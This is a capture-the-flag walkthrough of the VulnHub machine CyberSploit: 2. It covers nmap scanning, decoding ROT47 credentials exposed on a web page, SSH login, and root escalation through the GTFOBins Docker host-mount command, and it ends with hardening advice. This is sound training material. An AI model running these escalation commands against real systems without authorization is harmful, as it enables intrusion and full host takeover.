# CyberSploit: 2 (VulnHub)

## Overview

**CyberSploit: 2** is an Easy-level VulnHub machine created by **CyberSploit**. The machine focuses on web enumeration, source code analysis, credential decoding using ROT47, SSH authentication, Docker enumeration, and privilege escalation through Docker group membership.

The challenge demonstrates how weakly obfuscated credentials, exposed source code hints, and improper Docker permissions can be chained together to achieve complete system compromise.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | CyberSploit: 2 |
| Author | CyberSploit |
| Series | CyberSploit |
| Platform | VulnHub |
| Release Date | 16 July 2020 |
| Difficulty | Easy |
| Target OS | CentOS Linux |
| Attacker Machine | Kali Linux |
| Objective | Gain Root Access and Retrieve the Root Flag |

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- Source Code Analysis
- Information Disclosure
- ROT47 Decoding
- Credential Recovery
- SSH Authentication
- Linux Enumeration
- Docker Enumeration
- GTFOBins
- Docker Privilege Escalation
- Post Exploitation

## Tools Used

- Netdiscover
- Nmap
- SSH
- ROT47 Decoder
- Docker
- GTFOBins
- Linux Shell Commands
- Kali Linux

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Analyze the web application.
4. Inspect the page source.
5. Decode ROT47-encoded credentials.
6. Authenticate via SSH.
7. Enumerate the local system.
8. Discover Docker group membership.
9. Abuse Docker privileges.
10. Escalate privileges to root.
11. Retrieve the root flag.

## Network Discovery

Identify active hosts:

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.9
```

The target machine was successfully identified on the local network.

## Open Services Identified

Perform service enumeration:

```bash
sudo nmap -sC -sV -Pn 192.168.10.9 --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|------|----------|---------|
| 22 | SSH | OpenSSH 8.0 |
| 80 | HTTP | Apache httpd 2.4.37 (CentOS) |

Interesting finding:

```text
HTTP TRACE method enabled
```

The target exposed an SSH service and an Apache web server for further enumeration.

## Website Enumeration

Browse to:

```text
http://192.168.10.9
```

The webpage displayed several usernames and passwords.

Example:

```text
D92:=6?5C2
4J36CDA=@:E`
```

The values appeared to be encoded.

## Source Code Analysis

Inspect the HTML source code.

Interesting comment discovered:

```html
<--------ROT47-------->
```

The comment indicated that the credentials were encoded using the **ROT47** encoding scheme.

## Credential Recovery

Decode the strings using a ROT47 decoder.

Encoded values:

```text
D92:=6?5C2
4J36CDA=@:E`
```

Decoded output:

```text
Username: shailendra
Password: cybersploit1
```

Valid SSH credentials were successfully recovered.

## Initial Access

Authenticate via SSH:

```bash
ssh shailendra@192.168.10.9
```

Verify access:

```bash
whoami
id
```

Initial shell access was successfully obtained as user **shailendra**.

## User Enumeration

Inspect the user's home directory:

```bash
ls
```

Interesting file:

```text
hint.txt
```

Read the file:

```bash
cat hint.txt
```

Output:

```text
docker
```

The hint suggested Docker might be installed and exploitable.

## Docker Enumeration

Check Docker service status:

```bash
service docker status
```

Output confirmed Docker was running.

Check group membership:

```bash
groups
```

Output:

```text
shailendra docker
```

The current user belonged to the **docker** group, providing a potential privilege escalation path.

## Privilege Escalation

Using the GTFOBins Docker technique:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

Verify privileges:

```bash
whoami
id
```

Output:

```text
root
uid=0(root)
```

Root privileges were successfully obtained.

## Root Flag

Navigate to the root directory:

```bash
cd /root
```

Read the flag:

```bash
cat flag.txt
```

Output:

```text
Pwned CyberSploit2 POC
```

Root compromise was successfully achieved.

## Vulnerabilities Identified

### 1. Information Disclosure

Sensitive credentials were exposed through the web application.

### 2. Weak Obfuscation

Credentials were protected only using ROT47 encoding, which is easily reversible.

### 3. Source Code Disclosure

HTML source comments revealed the encoding method.

### 4. Excessive Docker Privileges

The compromised user belonged to the Docker group, effectively granting root-level access.

### 5. Improper Privilege Management

Docker permissions allowed unrestricted access to the host filesystem.

## Attack Chain Summary

- Network Discovery using Netdiscover
- Service Enumeration using Nmap
- Website Enumeration
- Source Code Analysis
- ROT47 Credential Decoding
- SSH Authentication
- Linux Enumeration
- Docker Enumeration
- Docker Privilege Escalation using GTFOBins
- Root Access
- Root Flag Retrieval

## Security Recommendations

- Never store sensitive credentials within web applications.
- Avoid using weak encoding schemes such as ROT47 for sensitive information.
- Remove sensitive comments from HTML source code.
- Restrict Docker group membership to trusted administrators only.
- Apply the principle of least privilege.
- Monitor Docker activity for suspicious behavior.
- Harden container runtime permissions.
- Conduct regular security audits and penetration testing.
- Implement proper access control mechanisms.
- Perform periodic privilege reviews.

## Key Learning Outcomes

- Source code inspection often reveals hidden attack vectors.
- Weak encoding mechanisms should never be used for credential protection.
- Enumeration is critical during every penetration test.
- Docker group membership is effectively equivalent to root access.
- GTFOBins provides reliable privilege escalation techniques for misconfigured systems.
- Proper privilege separation significantly reduces attack impact.

## Root Flag

```text
Pwned CyberSploit2 POC
```

## Conclusion

CyberSploit: 2 is an excellent beginner-friendly VulnHub machine that teaches web enumeration, source code analysis, credential recovery, SSH authentication, Docker enumeration, and Linux privilege escalation. The machine highlights the dangers of weak credential obfuscation and excessive Docker permissions while reinforcing the importance of secure coding practices and least privilege principles.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
